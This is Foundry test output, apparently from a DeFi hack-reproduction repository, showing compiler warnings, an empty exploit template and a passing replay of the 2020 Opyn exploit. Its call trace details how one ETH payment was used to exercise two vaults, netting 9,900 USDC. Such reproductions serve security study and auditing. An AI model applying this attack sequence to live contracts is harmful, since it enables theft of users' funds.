Compiling 28 files with Solc 0.8.17
Solc 0.8.17 finished in 1.13s
Compiler run successful with warnings:
Warning (2519): This declaration shadows an existing declaration.
   --> src/test/interface.sol:886:5:
    |
886 |     function WETH() external view returns (address);
    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1598:5:
     |
1598 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1850:5:
     |
1850 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2560:5:
     |
2560 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:3759:5:
     |
3759 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).


Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 20485)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [20485] ExploitScript::testExploit()
    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    │   └─ ← [Return] 
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 253.01ms (148.48µs CPU time)

Ran 1 test for src/test/2020-08/Opyn_exp.sol:ContractTest
[PASS] test_attack() (gas: 210626)
Logs:
  Attacker USDC balance before is     68504
  ------EXPLOIT-----
  Attacker USDC balance after is      78404
  Attacker profit is                   9900

Traces:
  [264426] ContractTest::test_attack()
    ├─ [0] VM::startPrank(0xe7870231992Ab4b1A01814FA0A599115FE94203f)
    │   └─ ← [Return] 
    ├─ [10075] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::balanceOf(0xe7870231992Ab4b1A01814FA0A599115FE94203f) [staticcall]
    │   ├─ [2789] 0x0882477e7895bdC5cea7cB1552ed914aB157Fe56::balanceOf(0xe7870231992Ab4b1A01814FA0A599115FE94203f) [delegatecall]
    │   │   └─ ← [Return] 68504683582 [6.85e10]
    │   └─ ← [Return] 68504683582 [6.85e10]
    ├─ [0] console::log("Attacker USDC balance before is    ", 68504 [6.85e4]) [staticcall]
    │   └─ ← [Stop] 
    ├─ [0] console::log("------EXPLOIT-----") [staticcall]
    │   └─ ← [Stop] 
    ├─ [88427] 0x951D51bAeFb72319d9FBE941E1615938d89ABfe2::addERC20CollateralOption(300000000 [3e8], 9900000000 [9.9e9], 0xe7870231992Ab4b1A01814FA0A599115FE94203f)
    │   ├─ [24732] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::transferFrom(0xe7870231992Ab4b1A01814FA0A599115FE94203f, 0x951D51bAeFb72319d9FBE941E1615938d89ABfe2, 9900000000 [9.9e9])
    │   │   ├─ [23937] 0x0882477e7895bdC5cea7cB1552ed914aB157Fe56::transferFrom(0xe7870231992Ab4b1A01814FA0A599115FE94203f, 0x951D51bAeFb72319d9FBE941E1615938d89ABfe2, 9900000000 [9.9e9]) [delegatecall]
    │   │   │   ├─ emit Transfer(from: 0xe7870231992Ab4b1A01814FA0A599115FE94203f, to: 0x951D51bAeFb72319d9FBE941E1615938d89ABfe2, value: 9900000000 [9.9e9])
    │   │   │   └─ ← [Return] true
    │   │   └─ ← [Return] true
    │   ├─ emit ERC20CollateralAdded(: 0xe7870231992Ab4b1A01814FA0A599115FE94203f, : 9900000000 [9.9e9], : 0xe7870231992Ab4b1A01814FA0A599115FE94203f)
    │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0xe7870231992Ab4b1A01814FA0A599115FE94203f, value: 300000000 [3e8])
    │   ├─ emit IssuedOTokens(: 0xe7870231992Ab4b1A01814FA0A599115FE94203f, : 300000000 [3e8], : 0xe7870231992Ab4b1A01814FA0A599115FE94203f)
    │   └─ ← [Stop] 
    ├─ [120348] 0x951D51bAeFb72319d9FBE941E1615938d89ABfe2::exercise{value: 30000000000000000000}(600000000 [6e8], [0xe7870231992Ab4b1A01814FA0A599115FE94203f, 0x01BDb7Ada61C82E951b9eD9F0d312DC9Af0ba0f2])
    │   ├─ emit Transfer(from: 0xe7870231992Ab4b1A01814FA0A599115FE94203f, to: 0x0000000000000000000000000000000000000000, value: 300000000 [3e8])
    │   ├─ [5405] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::transfer(0xe7870231992Ab4b1A01814FA0A599115FE94203f, 9900000000 [9.9e9])
    │   │   ├─ [4616] 0x0882477e7895bdC5cea7cB1552ed914aB157Fe56::transfer(0xe7870231992Ab4b1A01814FA0A599115FE94203f, 9900000000 [9.9e9]) [delegatecall]
    │   │   │   ├─ emit Transfer(from: 0x951D51bAeFb72319d9FBE941E1615938d89ABfe2, to: 0xe7870231992Ab4b1A01814FA0A599115FE94203f, value: 9900000000 [9.9e9])
    │   │   │   └─ ← [Return] true
    │   │   └─ ← [Return] true
    │   ├─ emit Exercise(: 30000000000000000000 [3e19], : 9900000000 [9.9e9], : 0xe7870231992Ab4b1A01814FA0A599115FE94203f, : 0xe7870231992Ab4b1A01814FA0A599115FE94203f)
    │   ├─ emit Transfer(from: 0xe7870231992Ab4b1A01814FA0A599115FE94203f, to: 0x0000000000000000000000000000000000000000, value: 300000000 [3e8])
    │   ├─ [11005] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::transfer(0xe7870231992Ab4b1A01814FA0A599115FE94203f, 9900000000 [9.9e9])
    │   │   ├─ [10216] 0x0882477e7895bdC5cea7cB1552ed914aB157Fe56::transfer(0xe7870231992Ab4b1A01814FA0A599115FE94203f, 9900000000 [9.9e9]) [delegatecall]
    │   │   │   ├─ emit Transfer(from: 0x951D51bAeFb72319d9FBE941E1615938d89ABfe2, to: 0xe7870231992Ab4b1A01814FA0A599115FE94203f, value: 9900000000 [9.9e9])
    │   │   │   └─ ← [Return] true
    │   │   └─ ← [Return] true
    │   ├─ emit Exercise(: 30000000000000000000 [3e19], : 9900000000 [9.9e9], : 0xe7870231992Ab4b1A01814FA0A599115FE94203f, : 0x01BDb7Ada61C82E951b9eD9F0d312DC9Af0ba0f2)
    │   └─ ← [Stop] 
    ├─ [11697] 0x951D51bAeFb72319d9FBE941E1615938d89ABfe2::removeUnderlying()
    │   ├─ [2269] 0xe7870231992Ab4b1A01814FA0A599115FE94203f::fallback{value: 30000000000000000000}()
    │   │   └─ ← [Stop] 
    │   ├─ emit RemoveUnderlying(: 30000000000000000000 [3e19], : 0xe7870231992Ab4b1A01814FA0A599115FE94203f)
    │   └─ ← [Stop] 
    ├─ [1575] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::balanceOf(0xe7870231992Ab4b1A01814FA0A599115FE94203f) [staticcall]
    │   ├─ [789] 0x0882477e7895bdC5cea7cB1552ed914aB157Fe56::balanceOf(0xe7870231992Ab4b1A01814FA0A599115FE94203f) [delegatecall]
    │   │   └─ ← [Return] 78404683582 [7.84e10]
    │   └─ ← [Return] 78404683582 [7.84e10]
    ├─ [0] console::log("Attacker USDC balance after is     ", 78404 [7.84e4]) [staticcall]
    │   └─ ← [Stop] 
    ├─ [0] console::log("Attacker profit is                  ", 9900) [staticcall]
    │   └─ ← [Stop] 
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 267.04ms (1.91ms CPU time)

Ran 2 test suites in 269.28ms (520.05ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
